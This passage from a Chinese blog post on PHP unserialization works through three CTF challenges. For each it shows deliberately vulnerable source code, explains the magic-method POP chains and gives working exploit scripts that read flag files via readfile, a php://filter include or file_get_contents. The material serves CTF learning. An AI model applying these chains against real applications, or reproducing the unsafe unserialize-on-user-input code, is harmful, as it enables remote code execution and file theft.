<h4 id="例题"><a href="#例题" class="headerlink" title="# 例题"></a><a class="link"   target="_blank" rel="noopener" href="https://fc04db.github.io/2024/04/09/PHP-Unserialize/#%E4%BE%8B%E9%A2%98" ># <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 例题</h4><h5 id="newstarctf-2023-week3-POP-Gadget"><a href="#newstarctf-2023-week3-POP-Gadget" class="headerlink" title="# newstarctf 2023 week3 | POP Gadget"></a><a class="link"   target="_blank" rel="noopener" href="https://fc04db.github.io/2024/04/09/PHP-Unserialize/#newstarctf-2023-week3-pop-gadget" ># <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> newstarctf 2023 week3 | POP Gadget</h5><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">class Begin&#123;</span><br><span class="line">    public $name;</span><br><span class="line"> </span><br><span class="line">    public function __destruct() //对象被销毁时触发</span><br><span class="line">    &#123;</span><br><span class="line">        if(preg_match(&quot;/[a-zA-Z0-9]/&quot;,$this-&gt;name))&#123;</span><br><span class="line">            echo &quot;Hello&quot;; //将对象当作字符串，可以触发__toString</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &quot;Welcome to NewStarCTF 2023!&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">class Then&#123;</span><br><span class="line">    private $func;</span><br><span class="line"> </span><br><span class="line">    public function __toString() //把对象当作字符串时触发</span><br><span class="line">    &#123;</span><br><span class="line">        ($this-&gt;func)(); //把对象当作方法（函数），触发__invoke</span><br><span class="line">        return &quot;Good Job!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">class Handle&#123;</span><br><span class="line">    protected $obj;</span><br><span class="line"> </span><br><span class="line">    public function __call($func, $vars) //调用不可访问的方法时触发</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;obj-&gt;end(); //调用end函数</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">class Super&#123;</span><br><span class="line">    protected $obj;</span><br><span class="line">    public function __invoke() //将对象调用为函数时触发</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;obj-&gt;getStr(); //不存在getStr方法，触发__call</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    public function end() //错误的end函数</span><br><span class="line">    &#123;</span><br><span class="line">        die(&quot;==GAME OVER==&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">class CTF&#123;</span><br><span class="line">    public $handle;</span><br><span class="line"> </span><br><span class="line">    public function end() // 正确的end函数</span><br><span class="line">    &#123;</span><br><span class="line">        unset($this-&gt;handle-&gt;log); //handle-&gt;log不可访问，触发__unset</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">class WhiteGod&#123;</span><br><span class="line">    public $func;</span><br><span class="line">    public $var;</span><br><span class="line"> </span><br><span class="line">    public function __unset($var) //在不可访问的属性上使用unset()时触发</span><br><span class="line">    &#123;</span><br><span class="line">        ($this-&gt;func)($this-&gt;var); //可以构造执行系统命令,比如:system(ls /)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">@unserialize($_POST[&#x27;pop&#x27;]); </span><br></pre></td></tr></table></figure></div>

<p>由此可以构造出 POP 链子</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Begin::__destruct -&gt; Then::toString -&gt; Super::__invoke -&gt; Handle::__call -&gt; CTF::end -&gt; WhiteGod::__unset</span><br></pre></td></tr></table></figure></div>

<p>由于链子调用中成员属性有 private 和 protected，用 construct 方法去调用链子，最后再使用 url 编码绕过</p>
<p>exp</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Begin&#123;    </span><br><span class="line">    public $name;    </span><br><span class="line">    public function __construct($a)    </span><br><span class="line">    &#123;        </span><br><span class="line">        $this-&gt;name = $a;    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Then&#123;    </span><br><span class="line">    private $func;    </span><br><span class="line">    public function __construct($a)    </span><br><span class="line">    &#123;        </span><br><span class="line">        $this-&gt;func= $a;    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Handle&#123;    </span><br><span class="line">    protected $obj;    </span><br><span class="line">    public function __construct($a)    </span><br><span class="line">    &#123;        </span><br><span class="line">        $this-&gt;obj = $a;    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Super&#123;    </span><br><span class="line">    protected $obj;    </span><br><span class="line">    public function __construct($a)    </span><br><span class="line">    &#123;        </span><br><span class="line">        $this-&gt;obj = $a;    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class CTF&#123;    </span><br><span class="line">    public $handle;    </span><br><span class="line">    public function __construct($a)    </span><br><span class="line">    &#123;        </span><br><span class="line">        $this-&gt;handle = $a;    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class WhiteGod&#123;    </span><br><span class="line">    public $func;    </span><br><span class="line">    public $var;    </span><br><span class="line">    public function __construct($a, $b)    </span><br><span class="line">    &#123;        </span><br><span class="line">        $this-&gt;func = $a;        </span><br><span class="line">        $this-&gt;var = $b;    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = new Begin(new Then(new Super(new Handle(new CTF(new WhiteGod(&quot;readfile&quot;,&quot;/flag&quot;))))));</span><br><span class="line">echo urlencode(serialize($a));</span><br></pre></td></tr></table></figure></div>

<p>稍微总结一下，POP 链的头一般是 GET&#x2F;POST 传参引发 <code>__wakeup</code> , <code>__construct</code> , <code>__destruct</code></p>
<p>结尾一般是输出敏感信息或者执行系统命令所在函数，即 GetFlag 的点</p>
<h5 id="MRCTF2020-Ezpop1"><a href="#MRCTF2020-Ezpop1" class="headerlink" title="# [MRCTF2020]Ezpop1"></a><a class="link"   target="_blank" rel="noopener" href="https://fc04db.github.io/2024/04/09/PHP-Unserialize/#mrctf2020ezpop1" ># <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> [MRCTF2020]Ezpop1</h5><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">Welcome to index.php</span><br><span class="line">&lt;?php</span><br><span class="line">//flag is in flag.php</span><br><span class="line">//WTF IS THIS?</span><br><span class="line">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span><br><span class="line">//And Crack It!</span><br><span class="line">class Modifier &#123;</span><br><span class="line">    protected  $var;</span><br><span class="line">    public function append($value)&#123;</span><br><span class="line">        include($value);</span><br><span class="line">    &#125;</span><br><span class="line">    public function __invoke()&#123;</span><br><span class="line">        $this-&gt;append($this-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">class Show&#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $str;</span><br><span class="line">    public function __construct($file=&#x27;index.php&#x27;)&#123;</span><br><span class="line">        $this-&gt;source = $file;</span><br><span class="line">        echo &#x27;Welcome to &#x27;.$this-&gt;source.&quot;&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        return $this-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&gt;source)) &#123;</span><br><span class="line">            echo &quot;hacker&quot;;</span><br><span class="line">            $this-&gt;source = &quot;index.php&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">class Test&#123;</span><br><span class="line">    public $p;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;p = array();</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    public function __get($key)&#123;</span><br><span class="line">        $function = $this-&gt;p;</span><br><span class="line">        return $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">if(isset($_GET[&#x27;pop&#x27;]))&#123;</span><br><span class="line">    @unserialize($_GET[&#x27;pop&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    $a=new Show;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure></div>

<p>先找出可以 getflag 的点，在 <code>Modifier</code> 类中 <code>append</code> 函数有 <code>include</code> 函数可以文件包含，可以利用， <code>__invoke</code> 函数直接调用了 <code>append</code> ，在 Testlei 中 <code>__get</code> 将 p 作为函数调用，会触发 <code>__invoke</code> , 在 <code>__totring</code> 方法中 <code>$this-&gt;str</code> 赋予 <code>test</code> 类，在 <code>test</code> 类读取 <code>source</code> 变量，（因为 <code>test</code> 类中没有 <code>source</code> 属性，则是访问了不可访问的属性）则会自动调用 <code>__get</code> 魔术方法， <code>__wakeup</code> 函数将对象进行正则匹配，会触发 <code>__toString</code> ，而 <code>__wakeup</code> 在反序列化时会调用，可以当作 pop 链头，而尾时 <code>include</code> 函数，可以利用 <code>var</code> 构造 php 为协议获取 flag</p>
<p>pop 链：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Show:__wakeup -&gt; Show:__toString -&gt; Test:__get -&gt; Modifier:__invoke -&gt;Modifier: append</span><br></pre></td></tr></table></figure></div>

<p>exp:</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Modifier &#123;</span><br><span class="line">	protected $var=&#x27;php://filter/read=convert.base64-encode/resource=flag.php&#x27;; //构造php为协议获取flag</span><br><span class="line">&#125;</span><br><span class="line">class Show&#123;</span><br><span class="line">	public $source;</span><br><span class="line">	public $str;</span><br><span class="line">	function _construct()&#123;</span><br><span class="line">		$this-&gt;source=$file;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">class Test&#123;</span><br><span class="line">	public $p;</span><br><span class="line">&#125;				 //1.将用到的类写出形成框架并表明类的属性（变量）</span><br><span class="line">$a = new show();</span><br><span class="line">$b = new show();</span><br><span class="line">$c = new test();</span><br><span class="line">$d = new Modifier(); //将用到的类实例化，用到几次实例化几次</span><br><span class="line">$a-&gt;source=$b;</span><br><span class="line">$b-&gt;str=$c;</span><br><span class="line">$c-&gt;p= $d;    //根据pop链将对象串联起来</span><br><span class="line">echo urlencode(serialize($a));  //序列化头并url编码（在这个题中有protected修饰的属性，会有不可见字符）</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>

<h5 id="2021-强网杯-赌徒"><a href="#2021-强网杯-赌徒" class="headerlink" title="# 2021 强网杯 赌徒"></a><a class="link"   target="_blank" rel="noopener" href="https://fc04db.github.io/2024/04/09/PHP-Unserialize/#2021-%E5%BC%BA%E7%BD%91%E6%9D%AF-%E8%B5%8C%E5%BE%92" ># <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 2021 强网杯 赌徒</h5><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">//hint is in hint.php</span><br><span class="line">error_reporting(1);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Start</span><br><span class="line">&#123;</span><br><span class="line">    public $name=&#x27;guest&#x27;;</span><br><span class="line">    public $flag=&#x27;syst3m(&quot;cat 127.0.0.1/etc/hint&quot;);&#x27;;</span><br><span class="line">    </span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        echo &quot;I think you need /etc/hint . Before this you need to see the source code&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function _sayhello()&#123;</span><br><span class="line">        echo $this-&gt;name;</span><br><span class="line">        return &#x27;ok&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        echo &quot;hi&quot;;</span><br><span class="line">        $this-&gt;_sayhello();</span><br><span class="line">    &#125;</span><br><span class="line">    public function __get($cc)&#123;</span><br><span class="line">        echo &quot;give you flag : &quot;.$this-&gt;flag;</span><br><span class="line">        return ;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Info</span><br><span class="line">&#123;</span><br><span class="line">    private $phonenumber=123123;</span><br><span class="line">    public $promise=&#x27;I do&#x27;;</span><br><span class="line">    </span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;promise=&#x27;I will not !!!!&#x27;;</span><br><span class="line">        return $this-&gt;promise;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        return $this-&gt;file[&#x27;filename&#x27;]-&gt;ffiillee[&#x27;ffiilleennaammee&#x27;];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Room</span><br><span class="line">&#123;</span><br><span class="line">    public $filename=&#x27;/flag&#x27;;</span><br><span class="line">    public $sth_to_set;</span><br><span class="line">    public $a=&#x27;&#x27;;</span><br><span class="line">    </span><br><span class="line">    public function __get($name)&#123;</span><br><span class="line">        $function = $this-&gt;a;</span><br><span class="line">        return $function();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    public function Get_hint($file)&#123;</span><br><span class="line">        $hint=base64_encode(file_get_contents($file));</span><br><span class="line">        echo $hint;</span><br><span class="line">        return ;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __invoke()&#123;</span><br><span class="line">        $content = $this-&gt;Get_hint($this-&gt;filename);</span><br><span class="line">        echo $content;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;hello&#x27;]))&#123;</span><br><span class="line">    unserialize($_GET[&#x27;hello&#x27;]);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    $hi = new  Start();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>

<p>尾部可以看到 <code>Room</code> 类中有个 <code>Get_hint()</code> 方法，里面有一个 <code>file_get_contents</code> ，可以实现任意文件读取，我们就可以利用这个读取 flag 文件了，然后就是往前倒推， <code>Room</code> 类中 <code>__invoke()</code> 方法调用了 <code>Get_hint()</code> ，然后 <code>Room</code> 类的 <code>__get()</code> 里面有个 <code>return $function()</code> 可以调用 <code>__invoke()</code> ，再往前看， <code>Info</code> 类中的 <code>__toString()</code> 中有 <code>Room</code> 类中不存在的属性，所以可以调用 <code>__get()</code> ，然后 <code>Start</code> 类中有个 <code>_sayhello()</code> 可以调用 <code>__toString()</code> ，然后在 <code>Start</code> 类中 <code>__wakeup()</code> 方法中直接调用了 <code>_sayhello()</code> ，而我们知道的是，输入字符串之后就会先进入 <code>__wakeup()</code></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">头 -&gt; Start::__wakeup() -&gt; Start::_sayhello() -&gt; Info::__toString() -&gt; Room::__get() -&gt; Room::invoke() -&gt; Room::Get_hint() </span><br><span class="line">&lt;?php</span><br><span class="line">class Start</span><br><span class="line">&#123;</span><br><span class="line">    public $name=&#x27;guest&#x27;;</span><br><span class="line">    public $flag=&#x27;syst3m(&quot;cat 127.0.0.1/etc/hint&quot;);&#x27;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Info</span><br><span class="line">&#123;</span><br><span class="line">    private $phonenumber=123123;</span><br><span class="line">    public $promise=&#x27;I do&#x27;;</span><br><span class="line">    </span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;promise=&#x27;I will not !!!!&#x27;;</span><br><span class="line">        return $this-&gt;promise;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Room</span><br><span class="line">&#123;</span><br><span class="line">    public $filename=&#x27;/flag&#x27;;</span><br><span class="line">    public $sth_to_set;</span><br><span class="line">    public $a=&#x27;&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">$a = new Start();</span><br><span class="line">$b = new Info();</span><br><span class="line">$c = new Room();</span><br><span class="line">$d = new Room();</span><br><span class="line">$a -&gt; name = $b;</span><br><span class="line">$b -&gt; file[&#x27;filename&#x27;] = $c;</span><br><span class="line">$c -&gt; a = $d;</span><br><span class="line">echo urlencode(serialize($a));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>

<p>在构建 pop 链时，除 <code>__construct</code> 函数一般不需要写出， 变量的权限与源码保持一致，在串联对象时，需要与源码的对应关系保持一致，比如： <code>$b -&gt; file[&#39;filename&#39;] = $c;</code></p>

        </div>

        
            <div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
                <div class="article-copyright-info-container">
    <ul>
        <li><strong>Title:</strong> </li>
        <li><strong>Author:</strong> mapl3miss</li>
        <li><strong>Created at
                :</strong> 2024-10-20 19:24:23</li>
        
            <li>
                <strong>Updated at
                    :</strong> 2024-09-28 17:59:28
            </li>
        
        <li>
            <strong>Link:</strong> https://redefine.ohevan.com/2024/10/20/PHP/
        </li>
        <li>
            <strong>
                License:
            </strong>
            

            
                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
            
        </li>
    </ul>
</div>

            </div>
        

        

        

        
            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
                
                
                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
                        <a class="next"
                        rel="next"
                        href="/2024/10/20/hello-world/"
                        >
                            <span class="title flex justify-center items-center">
                                <span class="post-nav-title-item">Hello World</span>
                                <span class="post-nav-item">Next posts</span>
                            </span>
                            <span class="right arrow-icon flex justify-center items-center">
                                <i class="fa-solid fa-chevron-right"></i>
                            </span>
                        </a>
                    </div>
                
            </div>
        


        
            <div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
                <div class="comments-container mt-10 w-full ">
    <div id="comment-anchor" class="w-full h-2.5"></div>
    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
        Comments
    </div>
    

        
            
    <div id="waline"></div>
    <script type="module" data-swup-reload-script>
      import { init } from '/js/libs/waline.mjs';

      function loadWaline() {
        init({
          el: '#waline',
          serverURL: 'https://example.example.com',
          lang: 'zh-CN',
          dark: 'body[class~="dark-mode"]',
          reaction: false,
          requiredMeta: ['nick', 'mail'],
          emoji: [],
          recaptchaV3Key: "wasd",
          
        });
      }

      if (typeof swup !== 'undefined') {
        loadWaline();
      } else {
        window.addEventListener('DOMContentLoaded', loadWaline);
      }
    </script>



        
    
</div>

            </div>
        
    </div>

    
        <div class="toc-content-container">
            <div class="post-toc-wrap">
    <div class="post-toc">
        <div class="toc-title">On this page</div>
        <div class="page-title"></div>
        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#PHP"><span class="nav-text">PHP</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#filter%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="nav-text">filter伪协议 </span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BC%B1%E6%AF%94%E8%BE%83"><span class="nav-text">弱比较</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%B6%E4%BB%96%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="nav-text">其他伪协议</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#data%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="nav-text">data伪协议</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#array-search%E5%87%BD%E6%95%B0%EF%BC%88%E9%81%8D%E5%8E%86%E6%95%B0%E7%BB%84%E6%89%BE%E5%AF%B9%E5%BA%94%E5%80%BC%EF%BC%89"><span class="nav-text">array_search函数（遍历数组找对应值）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BB%95%E8%BF%87"><span class="nav-text">绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="nav-text">魔术方法</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%95%E8%BF%87"><span class="nav-text"> 反序列化绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#POP"><span class="nav-text"> POP</span></a></li></ol></li></ol></li></ol>

    </div>
</div>
        </div>
    
</div>



                

            </div>

            

        </div>

        <div class="main-content-footer">
            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
    <div class="info-container py-3 text-center">
        
        <div class="text-center">
            &copy;
            
              <span>2022</span>
              -
            
            2024&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">mapl3miss</a>
            
                
                <p class="post-count space-x-0.5">
                    <span>
                        2 posts in total
                    </span>
                    
                </p>
            
        </div>
        
            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
                
                    <span id="busuanzi_container_site_uv" class="lg:!block">
                        <span class="text-sm">VISITOR COUNT</span>
                        <span id="busuanzi_value_site_uv"></span>
                    </span>
                
                
                    <span id="busuanzi_container_site_pv" class="lg:!block">
                        <span class="text-sm">TOTAL PAGE VIEWS</span>
                        <span id="busuanzi_value_site_pv"></span>
                    </span>
                
            </div>
        
        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
